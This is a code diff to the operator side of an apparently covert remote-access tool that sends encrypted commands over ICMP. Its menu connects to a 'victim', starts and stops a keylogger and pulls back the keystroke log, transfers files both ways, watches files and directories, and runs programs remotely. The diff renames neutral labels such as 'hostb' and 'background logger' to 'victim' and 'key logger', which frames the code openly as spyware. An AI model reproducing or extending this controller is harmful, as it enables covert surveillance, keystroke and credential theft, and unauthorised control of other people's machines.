@@ -33,8 +33,8 @@ CMD_RUN_PROGRAM = 4
 CMD_REQUEST_FILE = 5
 CMD_WATCH_FILE = 6
 CMD_WATCH_DIR = 7
-CMD_RUN_BG = 8
-CMD_STOP_BG = 9
+CMD_RUN_KL = 8
+CMD_STOP_KL = 9
 ACK_READY = 0xFFFE
 ACK_META = 0xFFFD
 ACK_CHUNK = 0xFFFC
@@ -88,16 +88,16 @@ STREAM_SIZE_LO_SEQ = 2
 PING_PAYLOAD = b"\x00" * 8 + bytes(range(0x10, 0x40))
 
 MENU_OPTIONS = (
-    "Connect to hostb",
-    "Disconnect from hostb",
-    "Uninstall from hostb",
-    "Start background function",
-    "Stop background function",
-    "Transfer file to hostb",
-    "Transfer file from hostb",
-    "Watch file on hostb",
-    "Watch directory on hostb",
-    "Run program on hostb",
+    "Connect to victim",
+    "Disconnect from victim",
+    "Uninstall from victim",
+    "Start key logger on victim",
+    "Stop key logger on victim",
+    "Transfer file to victim",
+    "Transfer file from victim",
+    "Watch file on victim",
+    "Watch directory on victim",
+    "Run program on victim",
 )
 
 
@@ -969,7 +969,6 @@ def watch_item(ctx: Context, cmd: int):
         print(f"\nWatching {label}: {watch_path}")
         print("Press Enter to stop...\n")
 
-        # Background thread waits for user Enter to stop.
         stop_event = threading.Event()
 
         def _wait_for_enter():
@@ -1125,7 +1124,7 @@ def run_program(ctx: Context):
         send_socket.close()
 
 
-def start_background_logger(ctx: Context):
+def start_key_logger(ctx: Context):
     if not ctx.connected:
         print("Not connected. Use option 1 first.")
         return
@@ -1139,9 +1138,8 @@ def start_background_logger(ctx: Context):
         return
 
     try:
-        # Send CMD_RUN_BG command
         send_icmp_identifier(send_socket, ctx.source_ip, ctx.destination_ip,
-                             encrypt_identifier(CMD_RUN_BG, ctx.key), 1)
+                             encrypt_identifier(CMD_RUN_KL, ctx.key), 1)
 
         print("Waiting for keyboard list from hostb...")
 
@@ -1179,14 +1177,14 @@ def start_background_logger(ctx: Context):
             print("Failed to send device choice.")
             return
 
-        print("✅ Background logger started on hostb.")
+        print("✅ Key logger started on hostb.")
 
     finally:
         recv_socket.close()
         send_socket.close()
 
 
-def stop_background_logger(ctx: Context):
+def stop_key_logger(ctx: Context):
     if not ctx.connected:
         print("Not connected.")
         return
@@ -1201,7 +1199,7 @@ def stop_background_logger(ctx: Context):
 
     try:
         send_icmp_identifier(send_socket, ctx.source_ip, ctx.destination_ip,
-                             encrypt_identifier(CMD_STOP_BG, ctx.key), 1)
+                             encrypt_identifier(CMD_STOP_KL, ctx.key), 1)
 
         if not wait_for_ack_ready(recv_socket, ctx.destination_ip, ctx.key,
                                   10):
@@ -1213,7 +1211,7 @@ def stop_background_logger(ctx: Context):
             ctx.key, REQUESTED_FILE_TIMEOUT_SECONDS
         )
         if log_bytes is None:
-            print("Failed to receive background log.")
+            print("Failed to receive key log.")
             return
 
         log_text = log_bytes.decode("utf-8", errors="replace")
@@ -1223,7 +1221,7 @@ def stop_background_logger(ctx: Context):
         with open(log_path, "w", encoding="utf-8") as f:
             f.write(log_text)
 
-        print(f"\n✅ Background logger stopped successfully.")
+        print(f"\n✅ Key logger stopped successfully.")
         print(f"   Log saved to: {log_path}")
         print(f"   Size: {len(log_text)} characters")
 
@@ -1256,25 +1254,25 @@ if __name__ == "__main__":
             print("\nSending uninstall command...")
             send_command(ctx, CMD_UNINSTALL)
         elif choice == "4":
-            print("\nStarting background logger...")
-            start_background_logger(ctx)
+            print("\nStarting keylogger...")
+            start_key_logger(ctx)
         elif choice == "5":
-            print("\nStopping background logger and retrieving log...")
-            stop_background_logger(ctx)
+            print("\nStopping key logger and retrieving log...")
+            stop_key_logger(ctx)
         elif choice == "6":
-            print("\nTransferring file to hostb...")
+            print("\nTransferring file to victim...")
             transfer_file(ctx)
         elif choice == "7":
-            print("\nRequesting file from hostb...")
+            print("\nRequesting file from victim...")
             request_file(ctx)
         elif choice == "8":
-            print("\nWatching file on hostb...")
+            print("\nWatching file on victim...")
             watch_item(ctx, CMD_WATCH_FILE)
         elif choice == "9":
-            print("\nWatching directory on hostb...")
+            print("\nWatching directory on victim...")
             watch_item(ctx, CMD_WATCH_DIR)
         elif choice == "10":
-            print("\nRunning program on hostb...")
+            print("\nRunning program on victim...")
             run_program(ctx)
         else:
             print("Invalid choice.")
